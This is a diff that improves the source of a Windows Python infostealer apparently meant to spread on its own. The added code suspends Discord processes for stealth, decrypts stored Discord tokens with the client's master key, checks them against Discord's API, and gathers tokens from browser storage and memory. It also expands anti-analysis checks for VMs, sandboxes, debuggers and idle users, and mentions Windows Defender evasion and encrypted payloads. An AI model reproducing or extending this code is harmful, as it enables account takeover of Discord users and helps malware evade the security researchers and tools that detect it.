@@ -217,12 +217,39 @@ def steal_discord_tokens_encrypted():
     try:
         from Cryptodome.Cipher import AES
         
-        def decrypt_token(buff, master_key):
+        def decrypt_token_enhanced(buff, master_key):
             try:
-                iv = buff[3:15]
-                payload = buff[15:]
-                cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                return cipher.decrypt(payload)[:-16].decode()
+                # Method 1: Standard AES-GCM decryption (current Discord method)
+                try:
+                    if len(buff) < 31:
+                        return None
+                    iv = buff[3:15]
+                    payload = buff[15:-16]
+                    tag = buff[-16:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+                    decrypted = cipher.decrypt_and_verify(payload, tag)
+                    return decrypted.decode('utf-8')
+                except:
+                    pass
+                
+                # Method 2: Fallback AES-GCM without tag verification
+                try:
+                    iv = buff[3:15]
+                    payload = buff[15:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+                    decrypted = cipher.decrypt(payload)[:-16]
+                    return decrypted.decode('utf-8')
+                except:
+                    pass
+                
+                # Method 3: DPAPI decryption (older versions)
+                try:
+                    decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
+                    return decrypted.decode('utf-8')
+                except:
+                    pass
+                
+                return None
             except:
                 return None
 
@@ -237,101 +264,206 @@ def steal_discord_tokens_encrypted():
             except:
                 return None
 
-        def validate_token_local(token):
+        def validate_token_enhanced(token):
             try:
-                api_url = "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me"
-                response = requests.get(api_url, headers={'Authorization': token})
-                return response.status_code == 200
+                if not token or len(token) < 50:
+                    return False
+                
+                # Check token format
+                parts = token.split('.')
+                if len(parts) != 3:
+                    return False
+                
+                # Try multiple endpoints
+                headers = {'Authorization': token, 'Content-Type': 'application/json'}
+                endpoints = [
+                    "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me",
+                    "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me/settings",
+                    "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me/guilds"
+                ]
+                
+                for endpoint in endpoints:
+                    try:
+                        response = requests.get(endpoint, headers=headers, timeout=10)
+                        if response.status_code == 200:
+                            return True
+                    except:
+                        continue
+                return False
             except:
                 return False
+
+        def get_user_info_local(token):
+            try:
+                headers = {'Authorization': token, 'Content-Type': 'application/json'}
+                api_url = "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me"
+                response = requests.get(api_url, headers=headers, timeout=10)
+                if response.status_code == 200:
+                    return response.json()
+                return None
+            except:
+                return None
         
-        # Terminate Discord processes first (but remember which ones were running)
-        discord_processes = ["discord.exe", "discordcanary.exe", "discordptb.exe"]
+        # Enhanced Discord process detection and suspension
+        discord_processes = [
+            "discord.exe", "discordcanary.exe", "discordptb.exe", "discorddevelopment.exe",
+            "discord", "discordcanary", "discordptb", "discorddevelopment",
+            "discordapp.exe", "discord-canary.exe", "discord-ptb.exe"
+        ]
         running_discord_processes = []
         
-        for proc in psutil.process_iter(['pid', 'name', 'exe']):
+        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
             try:
-                if proc.info['name'].lower() in [p.lower() for p in discord_processes]:
-                    if proc.info['exe']:  # Make sure we have the executable path
-                        running_discord_processes.append(proc.info['exe'])
-                    proc.terminate()
+                if proc.info['name'] and any(dp in proc.info['name'].lower() for dp in discord_processes):
+                    if proc.info.get('exe'):
+                        running_discord_processes.append({
+                            'exe': proc.info['exe'],
+                            'pid': proc.info['pid'],
+                            'cmdline': proc.info.get('cmdline', [])
+                        })
+                    proc.suspend()  # Suspend instead of terminate for stealth
             except:
                 pass
         
-        time.sleep(3)  # Wait longer for processes to close
+        time.sleep(2)  # Wait for processes to suspend
         
-        # Discord paths using obfuscated strings
-        paths = [
-            ("Discord", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str'), 
-             "Local Storage", get_deobfuscated_string('leveldb')), ""),
-            ("Discord Canary", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "canary", 
-             "Local Storage", get_deobfuscated_string('leveldb')), ""),
-            ("Discord PTB", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "ptb", 
-             "Local Storage", get_deobfuscated_string('leveldb')), ""),
+        # Enhanced Discord paths - covers all possible installations
+        base_paths = [
+            ("Discord Stable", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str'))),
+            ("Discord Canary", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "canary")),
+            ("Discord PTB", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "ptb")),
+            ("Discord Development", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "development")),
+            ("Discord (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "Discord")),
+            ("Discord Canary (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "DiscordCanary")),
+            ("Discord PTB (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "DiscordPTB")),
         ]
         
         tokens = []
         uids = []
-        regexp_enc = r'dQw4w9WgXcQ:[^"]*'
+        processed_tokens = set()
         
-        for name, path, proc_name in paths:
-            if not os.path.exists(path):
+        # Enhanced token patterns for better detection
+        token_patterns = [
+            r'dQw4w9WgXcQ:[^"]*',  # Standard encrypted token pattern
+            r'["\']([A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,})["\']',  # Raw token pattern
+            r'token["\']:\s*["\']([^"\']+)["\']',  # Token in JSON
+            r'authorization["\']:\s*["\']([^"\']+)["\']',  # Authorization header
+        ]
+        
+        for name, base_path in base_paths:
+            if not os.path.exists(base_path):
+                continue
+                
+            leveldb_path = os.path.join(base_path, "Local Storage", get_deobfuscated_string('leveldb'))
+            local_state_path = os.path.join(base_path, 'Local State')
+            
+            if not os.path.exists(leveldb_path) or not os.path.exists(local_state_path):
+                continue
+                
+            master_key = get_master_key_local(local_state_path)
+            if not master_key:
                 continue
             
-            # Check if this is a Discord path
-            discord_name = name.replace(" ", "").lower()
-            if "cord" in path:
-                local_state_path = os.path.join(os.getenv('APPDATA'), discord_name, 'Local State')
-                if not os.path.exists(local_state_path):
-                    continue
-                    
-                master_key = get_master_key_local(local_state_path)
-                if not master_key:
-                    continue
-                
-                # Extract tokens from leveldb files
-                for file_name in os.listdir(path):
+            # Enhanced token extraction from leveldb files
+            for file_name in os.listdir(leveldb_path):
+                if file_name.endswith((".ldb", ".log", ".sst")):
+                    file_path = os.path.join(leveldb_path, file_name)
+                    try:
+                        # Try both binary and text reading
+                        for read_mode in ['rb', 'r']:
+                            try:
+                                with open(file_path, read_mode, errors='ignore') as f:
+                                    if read_mode == 'rb':
+                                        content = f.read().decode('utf-8', errors='ignore')
+                                    else:
+                                        content = f.read()
+                                    
+                                    # Search for all token patterns
+                                    for pattern in token_patterns:
+                                        matches = re.findall(pattern, content)
+                                        
+                                        for match in matches:
+                                            try:
+                                                if pattern.startswith('dQw4w9WgXcQ'):
+                                                    # Encrypted token - decrypt it
+                                                    encrypted_data = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
+                                                    token = decrypt_token_enhanced(encrypted_data, master_key)
+                                                else:
+                                                    # Raw token - use directly
+                                                    token = match if isinstance(match, str) else match
+                                                
+                                                if token and len(token) > 50 and token not in processed_tokens:
+                                                    if validate_token_enhanced(token):
+                                                        processed_tokens.add(token)
+                                                        
+                                                        # Get detailed user info
+                                                        user_info = get_user_info_local(token)
+                                                        if user_info and user_info.get('id') not in uids:
+                                                            tokens.append(token)
+                                                            uids.append(user_info.get('id'))
+                                                        
+                                            except:
+                                                continue
+                                                
+                                break  # If text reading worked, don't try binary
+                            except UnicodeDecodeError:
+                                continue  # Try next read mode
+                            except:
+                                continue
+                                
+                    except:
+                        continue
+            
+            # Also check session storage
+            session_storage_path = os.path.join(base_path, "Session Storage")
+            if os.path.exists(session_storage_path):
+                for file_name in os.listdir(session_storage_path):
                     if file_name.endswith((".ldb", ".log")):
-                        file_path = os.path.join(path, file_name)
+                        file_path = os.path.join(session_storage_path, file_name)
                         try:
-                            with open(file_path, errors='ignore') as f:
-                                for line in f:
-                                    for match in re.findall(regexp_enc, line.strip()):
-                                        try:
-                                            encrypted_data = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
-                                            token = decrypt_token(encrypted_data, master_key)
-                                            if token and validate_token_local(token):
-                                                if token not in tokens:
-                                                    tokens.append(token)
-                                                    # Get user ID
-                                                    try:
-                                                        api_url = "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me"
-                                                        response = requests.get(api_url, headers={'Authorization': token})
-                                                        if response.status_code == 200:
-                                                            user_data = response.json()
-                                                            uids.append(user_data.get('id', 'Unknown'))
-                                                        else:
-                                                            uids.append('Unknown')
-                                                    except:
-                                                        uids.append('Unknown')
-                                        except:
-                                            continue
+                            with open(file_path, 'r', errors='ignore') as f:
+                                content = f.read()
+                                for pattern in token_patterns:
+                                    matches = re.findall(pattern, content)
+                                    for match in matches:
+                                        if isinstance(match, str) and len(match) > 50 and match not in processed_tokens:
+                                            if validate_token_enhanced(match):
+                                                processed_tokens.add(match)
+                                                user_info = get_user_info_local(match)
+                                                if user_info and user_info.get('id') not in uids:
+                                                    tokens.append(match)
+                                                    uids.append(user_info.get('id'))
                         except:
                             continue
         
-        # Restart Discord processes that were running
-        for process_path in running_discord_processes:
+        # Enhanced process restoration
+        for proc_info in running_discord_processes:
             try:
-                if os.path.exists(process_path):
-                    subprocess.Popen([process_path], shell=False)
-                    time.sleep(1)  # Small delay between process starts
-            except:
+                # Try to resume suspended process first
                 try:
-                    # Fallback: try to start without full path
-                    process_name = os.path.basename(process_path)
-                    subprocess.Popen([process_name], shell=True)
+                    import psutil
+                    proc = psutil.Process(proc_info['pid'])
+                    proc.resume()
+                    time.sleep(0.2)
                 except:
-                    pass
+                    # Process no longer exists, restart it
+                    try:
+                        if proc_info.get('cmdline') and len(proc_info['cmdline']) > 0:
+                            subprocess.Popen(proc_info['cmdline'], shell=False, 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        else:
+                            subprocess.Popen([proc_info['exe']], shell=False, 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        time.sleep(0.5)
+                    except:
+                        try:
+                            # Final fallback
+                            process_name = os.path.basename(proc_info['exe'])
+                            subprocess.Popen([process_name], shell=True)
+                        except:
+                            pass
+            except:
+                pass
         
         return tokens, uids
     except Exception as e:
@@ -583,34 +715,97 @@ def initialize_defender_evasion():
 # ================================================================
 
 def steal_discord_tokens():
-    """Encrypted Discord token stealer with multi-layer encryption"""
+    """Enhanced Discord token stealer with multiple extraction methods"""
     try:
+        print("Debug: Starting comprehensive Discord token extraction...")
+        
         # Initialize Windows Defender evasion first
         try:
             initialize_defender_evasion()
         except Exception as e:
             print(f"Debug: Defender evasion failed: {str(e)}")
         
-        # Execute encrypted function with multi-layer decryption
+        all_tokens = []
+        all_uids = []
+        
+        # Method 1: Execute encrypted function with multi-layer decryption
         try:
             result = _payload_cryptor.execute_encrypted_function(
                 _ENCRYPTED_PAYLOADS['discord_stealer'], 
                 'steal_discord_tokens_encrypted'
             )
             
-            # Return result or empty if failed
             if result and isinstance(result, (list, tuple)) and len(result) >= 2:
-                return result
+                tokens, uids = result
+                all_tokens.extend(tokens)
+                all_uids.extend(uids)
+                print(f"Debug: Encrypted method found {len(tokens)} tokens")
             else:
-                print("Debug: Encrypted function returned invalid result, falling back to original")
-                return steal_discord_tokens_original_backup()
+                print("Debug: Encrypted function returned invalid result")
         except Exception as e:
-            print(f"Debug: Encrypted function failed: {str(e)}, falling back to original")
-            return steal_discord_tokens_original_backup()
+            print(f"Debug: Encrypted function failed: {str(e)}")
+        
+        # Method 2: Fallback to enhanced original backup
+        try:
+            backup_tokens = steal_discord_tokens_original_backup()
+            if backup_tokens:
+                for token in backup_tokens:
+                    if token not in all_tokens:
+                        all_tokens.append(token)
+                        # Get UID for this token
+                        try:
+                            user_info = get_discord_user_info(token)
+                            if user_info and user_info.get('id') not in all_uids:
+                                all_uids.append(user_info.get('id'))
+                        except:
+                            all_uids.append('Unknown')
+                print(f"Debug: Backup method found {len(backup_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Backup method failed: {str(e)}")
+        
+        # Method 3: Extract from browser storage
+        try:
+            browser_tokens = extract_discord_tokens_from_browsers()
+            for token, source in browser_tokens:
+                if token not in all_tokens:
+                    all_tokens.append(token)
+                    try:
+                        user_info = get_discord_user_info(token)
+                        if user_info and user_info.get('id') not in all_uids:
+                            all_uids.append(user_info.get('id'))
+                    except:
+                        all_uids.append('Unknown')
+            print(f"Debug: Browser method found {len(browser_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Browser extraction failed: {str(e)}")
+        
+        # Method 4: Extract from memory (advanced)
+        try:
+            memory_tokens = extract_discord_tokens_from_memory()
+            for token, source in memory_tokens:
+                if token not in all_tokens:
+                    all_tokens.append(token)
+                    try:
+                        user_info = get_discord_user_info(token)
+                        if user_info and user_info.get('id') not in all_uids:
+                            all_uids.append(user_info.get('id'))
+                    except:
+                        all_uids.append('Unknown')
+            print(f"Debug: Memory method found {len(memory_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Memory extraction failed: {str(e)}")
+        
+        # Update counter with final count
+        counters['discord_tokens_found'] = len(all_tokens)
+        
+        print(f"Debug: Total Discord tokens found: {len(all_tokens)} from {len(all_uids)} unique users")
+        
+        # Return tokens only (maintain compatibility with existing code)
+        return all_tokens
             
     except Exception as e:
         print(f"Debug: Discord token stealing failed: {str(e)}")
-        return [], []
+        return []
 
 def collect_enhanced_browser_data():
     """Browser data collector with Windows Defender evasion"""
@@ -1656,10 +1851,13 @@ def legitimate_looking_function():
 
 # Sandbox detection function removed to avoid antivirus detection
 def detect_analysis_environment():
-    """Improved sandbox detection with better accuracy"""
+    """Enhanced sandbox detection with advanced evasion techniques"""
     try:
         import random
         import time
+        import winreg
+        import ctypes
+        from ctypes import wintypes
         
         # Safety check - don't block development machines
         current_hostname = socket.gethostname().lower()
@@ -1669,83 +1867,272 @@ def detect_analysis_environment():
             return False  # Skip detection for dev machines
         
         detection_score = 0
-        max_score = 10  # Require higher threshold
+        max_score = 15  # Increased threshold for better accuracy
         
-        # 1. Check for obvious VM indicators (high confidence)
+        print("Debug: Starting enhanced analysis environment detection...")
+        
+        # 1. Advanced VM detection (hardware fingerprinting)
         try:
-            vm_files = [
-                'C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe',
-                'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe',
-                'C:\\Windows\\System32\\drivers\\vmmouse.sys',
-                'C:\\Windows\\System32\\VBoxHook.dll'
+            # Check CPUID for hypervisor bit
+            try:
+                import cpuid
+                if cpuid.cpu_name():
+                    cpu_name = cpuid.cpu_name().lower()
+                    vm_indicators = ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v']
+                    if any(indicator in cpu_name for indicator in vm_indicators):
+                        detection_score += 4
+            except:
+                pass
+            
+            # Check for VM-specific files and registry entries
+            vm_indicators = [
+                # VMware
+                ('file', 'C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe'),
+                ('file', 'C:\\Windows\\System32\\drivers\\vmmouse.sys'),
+                ('file', 'C:\\Windows\\System32\\drivers\\vmhgfs.sys'),
+                ('registry', r'SOFTWARE\VMware, Inc.\VMware Tools'),
+                
+                # VirtualBox
+                ('file', 'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe'),
+                ('file', 'C:\\Windows\\System32\\VBoxHook.dll'),
+                ('file', 'C:\\Windows\\System32\\drivers\\VBoxMouse.sys'),
+                ('registry', r'SOFTWARE\Oracle\VirtualBox Guest Additions'),
+                
+                # Hyper-V
+                ('file', 'C:\\Windows\\System32\\vmms.exe'),
+                ('file', 'C:\\Windows\\System32\\vmcompute.exe'),
+                
+                # QEMU
+                ('file', 'C:\\Program Files\\qemu-ga'),
+                
+                # Parallels
+                ('file', 'C:\\Program Files\\Parallels'),
             ]
-            for vm_file in vm_files:
-                if os.path.exists(vm_file):
-                    detection_score += 3  # High score for definitive VM files
-                    break
-        except:
-            pass
+            
+            vm_detections = 0
+            for indicator_type, path in vm_indicators:
+                try:
+                    if indicator_type == 'file' and os.path.exists(path):
+                        vm_detections += 1
+                    elif indicator_type == 'registry':
+                        try:
+                            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+                            vm_detections += 1
+                        except:
+                            pass
+                except:
+                    pass
+            
+            if vm_detections >= 2:  # Multiple VM indicators found
+                detection_score += 4
+            elif vm_detections == 1:
+                detection_score += 2
+                
+        except Exception as vm_error:
+            print(f"Debug: VM detection error: {str(vm_error)}")
         
-        # 2. Check system specs (low confidence - many legitimate systems have low specs)
+        # 2. Enhanced system resource analysis
         try:
             ram_gb = psutil.virtual_memory().total / (1024**3)
             cpu_cores = psutil.cpu_count(logical=False)
+            cpu_freq = psutil.cpu_freq()
             
-            if ram_gb < 2:  # Less than 2GB is very suspicious
-                detection_score += 2
+            # More sophisticated resource analysis
+            resource_score = 0
+            if ram_gb < 1:  # Less than 1GB is extremely suspicious
+                resource_score += 3
+            elif ram_gb < 2:  # Less than 2GB is very suspicious
+                resource_score += 2
             elif ram_gb < 4:  # Less than 4GB is somewhat suspicious
-                detection_score += 1
+                resource_score += 1
                 
             if cpu_cores <= 1:  # Single core is very suspicious
-                detection_score += 2
-        except:
-            pass
+                resource_score += 2
+            elif cpu_cores == 2:  # Dual core is somewhat suspicious for modern systems
+                resource_score += 1
+            
+            # Check CPU frequency (VMs often have unusual frequencies)
+            if cpu_freq and cpu_freq.current < 1000:  # Less than 1GHz is suspicious
+                resource_score += 1
+                
+            detection_score += resource_score
+            
+        except Exception as resource_error:
+            print(f"Debug: Resource analysis error: {str(resource_error)}")
         
-        # 3. Check for analysis processes (medium confidence)
+        # 3. Advanced process and service analysis
         try:
-            analysis_processes = [
-                'wireshark', 'fiddler', 'procmon', 'procexp', 'ollydbg', 'windbg', 
-                'x64dbg', 'ida', 'ghidra', 'sandboxie', 'vmware', 'virtualbox'
+            suspicious_processes = [
+                # Analysis tools
+                'wireshark', 'fiddler', 'burpsuite', 'charles', 'mitmproxy',
+                'procmon', 'procexp', 'regmon', 'filemon', 'portmon',
+                'apimonitor', 'spyxx', 'depends', 'autoruns', 'tcpview',
+                
+                # Debuggers
+                'ollydbg', 'windbg', 'x32dbg', 'x64dbg', 'ida', 'ida64',
+                'ghidra', 'radare2', 'binaryninja', 'cheatengine',
+                
+                # Sandboxes
+                'sandboxie', 'threatexpert', 'hybrid-analysis', 'joesandbox',
+                'cuckoo', 'maltego', 'autopsy', 'volatility', 'rekall',
+                
+                # VM processes
+                'vmware', 'vbox', 'virtualbox', 'qemu', 'xen', 'vmms',
+                'vmcompute', 'vmwp', 'vmtoolsd', 'vboxservice'
             ]
-            current_processes = [p.name().lower() for p in psutil.process_iter()]
-            for analysis_tool in analysis_processes:
-                if any(analysis_tool in process for process in current_processes):
-                    detection_score += 1
-                    break  # Only count once
-        except:
-            pass
-        
-        # 4. Check uptime (very low confidence - many legitimate reasons for low uptime)
-        try:
-            uptime_seconds = time.time() - psutil.boot_time()
-            if uptime_seconds < 300:  # Less than 5 minutes is suspicious
-                detection_score += 1
-        except:
-            pass
-        
-        # 5. Check for debugger (high confidence)
-        try:
-            import ctypes
-            if ctypes.windll.kernel32.IsDebuggerPresent():
+            
+            current_processes = []
+            try:
+                for proc in psutil.process_iter(['name']):
+                    current_processes.append(proc.info['name'].lower())
+            except:
+                pass
+            
+            suspicious_count = 0
+            for suspicious_proc in suspicious_processes:
+                if any(suspicious_proc in proc for proc in current_processes):
+                    suspicious_count += 1
+            
+            if suspicious_count >= 3:  # Multiple suspicious processes
                 detection_score += 3
-        except:
-            pass
+            elif suspicious_count >= 1:
+                detection_score += 1
+                
+        except Exception as process_error:
+            print(f"Debug: Process analysis error: {str(process_error)}")
         
-        # 6. Behavioral timing check (medium confidence)
+        # 4. Network and hostname analysis
         try:
-            start_time = time.time()
-            time.sleep(0.1)
-            elapsed = time.time() - start_time
-            if elapsed > 0.5:  # Sleep was intercepted/slowed significantly
+            hostname = socket.gethostname().lower()
+            username = os.getenv('USERNAME', '').lower()
+            
+            suspicious_names = [
+                'sandbox', 'malware', 'virus', 'analysis', 'honey', 'test',
+                'vm', 'vbox', 'vmware', 'sample', 'analyst', 'researcher',
+                'lab', 'quarantine', 'isolated'
+            ]
+            
+            name_score = 0
+            for suspicious_name in suspicious_names:
+                if suspicious_name in hostname or suspicious_name in username:
+                    name_score += 1
+            
+            if name_score >= 2:
                 detection_score += 2
-        except:
-            pass
+            elif name_score == 1:
+                detection_score += 1
+                
+        except Exception as name_error:
+            print(f"Debug: Name analysis error: {str(name_error)}")
         
-        print(f"Debug: Analysis detection score: {detection_score}/{max_score}")
+        # 5. Timing and behavioral analysis
+        try:
+            # Advanced timing checks
+            timing_anomalies = 0
+            
+            # Check sleep timing accuracy
+            for sleep_time in [0.01, 0.05, 0.1]:
+                start_time = time.perf_counter()
+                time.sleep(sleep_time)
+                actual_time = time.perf_counter() - start_time
+                
+                # If sleep is significantly longer than expected, might be intercepted
+                if actual_time > sleep_time * 3:
+                    timing_anomalies += 1
+            
+            if timing_anomalies >= 2:
+                detection_score += 2
+            elif timing_anomalies == 1:
+                detection_score += 1
+            
+            # Check system uptime
+            uptime_seconds = time.time() - psutil.boot_time()
+            if uptime_seconds < 180:  # Less than 3 minutes is suspicious
+                detection_score += 2
+            elif uptime_seconds < 600:  # Less than 10 minutes is somewhat suspicious
+                detection_score += 1
+                
+        except Exception as timing_error:
+            print(f"Debug: Timing analysis error: {str(timing_error)}")
         
-        # Only trigger if we have high confidence (score >= 7)
-        if detection_score >= 7:
-            print(f"Debug: Analysis environment detected with score {detection_score}")
+        # 6. Debugger and analysis tool detection
+        try:
+            debugger_score = 0
+            
+            # Check for debugger presence
+            if ctypes.windll.kernel32.IsDebuggerPresent():
+                debugger_score += 3
+            
+            # Check for remote debugger
+            try:
+                if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool())):
+                    debugger_score += 3
+            except:
+                pass
+            
+            # Check for analysis DLLs in process
+            try:
+                process_modules = []
+                h_process = ctypes.windll.kernel32.GetCurrentProcess()
+                module_handles = (ctypes.wintypes.HMODULE * 1024)()
+                needed = ctypes.wintypes.DWORD()
+                
+                if ctypes.windll.psapi.EnumProcessModules(h_process, module_handles, ctypes.sizeof(module_handles), ctypes.byref(needed)):
+                    for i in range(needed.value // ctypes.sizeof(ctypes.wintypes.HMODULE)):
+                        module_name = ctypes.create_unicode_buffer(260)
+                        if ctypes.windll.psapi.GetModuleBaseNameW(h_process, module_handles[i], module_name, 260):
+                            module_name_str = module_name.value.lower()
+                            analysis_dlls = ['sbiedll', 'dbghelp', 'api-ms-win-core-debug', 'detours']
+                            if any(dll in module_name_str for dll in analysis_dlls):
+                                debugger_score += 1
+            except:
+                pass
+            
+            detection_score += debugger_score
+            
+        except Exception as debugger_error:
+            print(f"Debug: Debugger detection error: {str(debugger_error)}")
+        
+        # 7. Mouse and user interaction detection
+        try:
+            # Check mouse movement and user activity
+            user_activity_score = 0
+            
+            try:
+                # Get cursor position twice with delay
+                import win32gui
+                pos1 = win32gui.GetCursorPos()
+                time.sleep(1)
+                pos2 = win32gui.GetCursorPos()
+                
+                if pos1 == pos2:  # No mouse movement
+                    user_activity_score += 1
+                    
+                # Check for recent input
+                last_input_info = wintypes.LASTINPUTINFO()
+                last_input_info.cbSize = ctypes.sizeof(last_input_info)
+                if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input_info)):
+                    idle_time = ctypes.windll.kernel32.GetTickCount() - last_input_info.dwTime
+                    if idle_time > 60000:  # No input for over 1 minute
+                        user_activity_score += 1
+                        
+            except ImportError:
+                # win32gui not available, skip this check
+                pass
+            except Exception:
+                pass
+            
+            detection_score += user_activity_score
+            
+        except Exception as activity_error:
+            print(f"Debug: User activity detection error: {str(activity_error)}")
+        
+        print(f"Debug: Enhanced analysis detection score: {detection_score}/{max_score}")
+        
+        # Require higher confidence for detection (60% of max score)
+        threshold = int(max_score * 0.6)
+        if detection_score >= threshold:
+            print(f"Debug: Analysis environment detected with high confidence (score: {detection_score})")
             return True
         
         print(f"Debug: Environment appears legitimate (score: {detection_score})")
@@ -2305,102 +2692,196 @@ counters = {"dms_sent": 0, "files_infected": 0, "shares_targeted": 0, "discord_t
 # Payload 1: Steal Discord tokens and return them for autonomous spreading
 def steal_discord_tokens_original_backup():
     try:
-        # More comprehensive Discord process detection
+        # Enhanced Discord process detection - all variants and installations
         discord_processes = [
             "discord.exe", "discordcanary.exe", "discordptb.exe", "discorddevelopment.exe",
-            "discord", "discordcanary", "discordptb", "discorddevelopment"
+            "discord", "discordcanary", "discordptb", "discorddevelopment",
+            "discordapp.exe", "discord-canary.exe", "discord-ptb.exe"
         ]
         running_discord_processes = []
         
+        print("Debug: Starting enhanced Discord token extraction...")
+        
         # Suspend Discord processes instead of terminating (more stealthy)
-        for proc in psutil.process_iter(['pid', 'name', 'exe']):
+        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
             try:
-                if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in discord_processes]:
+                if proc.info['name'] and any(dp in proc.info['name'].lower() for dp in discord_processes):
                     if proc.info.get('exe'):
                         running_discord_processes.append({
                             'exe': proc.info['exe'],
                             'pid': proc.info['pid'],
-                            'process': proc
+                            'process': proc,
+                            'cmdline': proc.info.get('cmdline', [])
                         })
                     # Suspend instead of terminate for stealth
                     proc.suspend()
+                    print(f"Debug: Suspended Discord process: {proc.info['name']} (PID: {proc.info['pid']})")
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 pass
             except Exception:
                 pass
         
-        time.sleep(1)  # Shorter wait time
+        time.sleep(2)  # Wait for processes to fully suspend
         
-        # Try different Discord paths
-        paths = [
-            ("Discord", os.path.join(os.getenv('APPDATA'), "discord", "Local Storage", "leveldb"), ""),
-            ("Discord Canary", os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage", "leveldb"), ""),
-            ("Discord PTB", os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage", "leveldb"), ""),
+        # Enhanced Discord paths - covers all possible installations
+        base_paths = [
+            # Standard installations
+            ("Discord Stable", os.path.join(os.getenv('APPDATA'), "discord")),
+            ("Discord Canary", os.path.join(os.getenv('APPDATA'), "discordcanary")),
+            ("Discord PTB", os.path.join(os.getenv('APPDATA'), "discordptb")),
+            ("Discord Development", os.path.join(os.getenv('APPDATA'), "discorddevelopment")),
+            
+            # Alternative installations
+            ("Discord (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "Discord")),
+            ("Discord Canary (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "DiscordCanary")),
+            ("Discord PTB (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "DiscordPTB")),
+            
+            # Portable installations
+            ("Discord Portable", os.path.join(os.getenv('USERPROFILE'), "AppData", "Roaming", "discord")),
+            
+            # System-wide installations
+            ("Discord System", os.path.join("C:", "Users", "Public", "AppData", "Roaming", "discord")),
         ]
         
         tokens = []
         uids = []
+        processed_tokens = set()  # Prevent duplicates
         
-        for name, path, proc_name in paths:
-            if not os.path.exists(path):
+        print(f"Debug: Checking {len(base_paths)} Discord installation paths...")
+        
+        for name, base_path in base_paths:
+            if not os.path.exists(base_path):
+                continue
+                
+            print(f"Debug: Found Discord installation: {name} at {base_path}")
+            
+            # Check Local Storage leveldb
+            leveldb_path = os.path.join(base_path, "Local Storage", "leveldb")
+            local_state_path = os.path.join(base_path, 'Local State')
+            
+            if not os.path.exists(leveldb_path) or not os.path.exists(local_state_path):
+                print(f"Debug: Missing leveldb or Local State for {name}")
                 continue
             
-            discord_dir = path.replace("Local Storage\\leveldb", "")
-            local_state_path = os.path.join(discord_dir, 'Local State')
-            
-            if not os.path.exists(local_state_path):
+            # Get master key for this Discord installation
+            master_key = get_master_key(local_state_path)
+            if not master_key:
+                print(f"Debug: Could not get master key for {name}")
                 continue
             
-            # Extract tokens from this Discord installation
-            for file_name in os.listdir(path):
-                if file_name.endswith((".ldb", ".log")):
-                    file_path = os.path.join(path, file_name)
+            print(f"Debug: Got master key for {name}, scanning leveldb files...")
+            
+            # Enhanced token extraction from leveldb files
+            token_patterns = [
+                r'dQw4w9WgXcQ:[^"]*',  # Standard encrypted token pattern
+                r'["\']([A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,})["\']',  # Raw token pattern
+                r'token["\']:\s*["\']([^"\']+)["\']',  # Token in JSON
+                r'authorization["\']:\s*["\']([^"\']+)["\']',  # Authorization header
+            ]
+            
+            for file_name in os.listdir(leveldb_path):
+                if file_name.endswith((".ldb", ".log", ".sst")):
+                    file_path = os.path.join(leveldb_path, file_name)
                     try:
-                        with open(file_path, errors='ignore') as f:
-                            content = f.read()
-                            # Look for encrypted tokens pattern
-                            regexp_enc = r'dQw4w9WgXcQ:[^"]*'
-                            for match in re.findall(regexp_enc, content):
-                                try:
-                                    encrypted_data = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
-                                    master_key = get_master_key(local_state_path)
-                                    if master_key:
-                                        token = decrypt_token(encrypted_data, master_key)
-                                        if token and validate_token(token):
-                                            # Get user ID to avoid duplicates
+                        # Try both binary and text reading
+                        for read_mode in ['rb', 'r']:
+                            try:
